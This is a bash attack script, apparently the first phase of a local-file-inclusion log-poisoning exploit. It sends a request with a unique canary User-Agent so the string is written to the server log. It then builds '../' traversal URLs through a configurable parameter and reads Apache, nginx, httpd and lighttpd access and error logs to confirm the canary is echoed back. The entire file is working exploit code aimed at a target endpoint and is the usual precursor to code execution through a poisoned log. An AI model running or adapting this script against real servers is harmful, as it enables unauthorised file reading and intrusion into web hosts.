#!/bin/bash
# User-Agent Canary Probe -- Phase 1: inject unique UA into access.log, verify via LFI
# 用法: canary_ua.sh <ENDPOINT> <TARGET_IP>
set -euo pipefail

ENDPOINT="${1:-http://127.0.0.1:80}"
TARGET_IP="${2:-127.0.0.1}"

BASE=$(echo "$ENDPOINT" | sed 's|^\(https\?://[^/]*\).*|\1|')
echo "=== User-Agent Canary Probe (Phase 1) ==="

CANARY="UACANARY$(date +%s)"
echo "[INFO] canary=$CANARY"
curl -s "$BASE/" -H "User-Agent: $CANARY" --max-time 5 >/dev/null 2>&1 || true
sleep 2

CONFIRMED_PARAM="${lfi_param:-}"
CONFIRMED_DEPTH="${lfi_depth:-}"
LFI_STYLE="${lfi_style:-relative}"
LFI_PATH="${lfi_path:-}"
[ -z "$CONFIRMED_PARAM" ] && [ -z "$LFI_PATH" ] && CONFIRMED_PARAM="page"
[ -z "$CONFIRMED_DEPTH" ] && CONFIRMED_DEPTH="5"

build_lfi_url() {
  local target_file="$1"
  if [ "$LFI_STYLE" = "absolute" ]; then
    if [ -n "$LFI_PATH" ]; then
      echo "$BASE${LFI_PATH}/${target_file}"
    else
      echo "$BASE/?$CONFIRMED_PARAM=/${target_file}"
    fi
  else
    local TRAV
    TRAV=$(printf '../%.0s' $(seq 1 "$CONFIRMED_DEPTH"))
    if [ -n "$LFI_PATH" ]; then
      echo "$BASE${LFI_PATH}${TRAV}${target_file}"
    else
      echo "$BASE/?$CONFIRMED_PARAM=${TRAV}${target_file}"
    fi
  fi
}

ACCESS_LOGS="var/log/apache2/access.log var/log/apache2/error.log \
             var/log/nginx/access.log var/log/nginx/error.log \
             var/log/httpd/access_log var/log/httpd/error_log \
             var/log/lighttpd/access.log"
for logpath in $ACCESS_LOGS; do
  url=$(build_lfi_url "$logpath")
  echo "[READ] $url"
  result=$(curl -s "$url" --max-time 8 2>/dev/null)
  if echo "$result" | grep -q "$CANARY"; then
    echo "[HIT] Canary echoed in $logpath"
    echo "UA_CANARY_OK:$logpath"
    exit 0
  fi
  sz=${#result}
  echo "[MISS] $logpath (${sz}B, no canary)"
done
echo "UA_CANARY_FAIL"
